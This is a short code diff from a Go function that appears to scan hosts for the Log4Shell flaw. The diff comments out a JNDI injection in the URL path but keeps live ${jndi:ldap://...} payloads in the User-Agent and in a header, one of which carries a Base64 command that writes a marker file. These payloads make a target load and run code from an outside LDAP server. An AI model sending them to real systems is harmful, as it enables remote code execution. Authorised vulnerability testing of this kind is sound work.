@@ -27,7 +27,8 @@ func ScanIP(url string, serverUrl string, wg *sync.WaitGroup, resChan chan strin
 	}
 
 	log.Debugf("Target URL: %s", url)
-	targetUrl := fmt.Sprintf("%s/${jndi:ldap://%s/exploit.class}", url, serverUrl)
+	//targetUrl := fmt.Sprintf("%s/${jndi:ldap://%s/exploit.class}", url, serverUrl)
+	targetUrl := url
 	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
 	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", serverUrl)
 	//log.Debugf("Target User-Agent: %s", targetUserAgent)
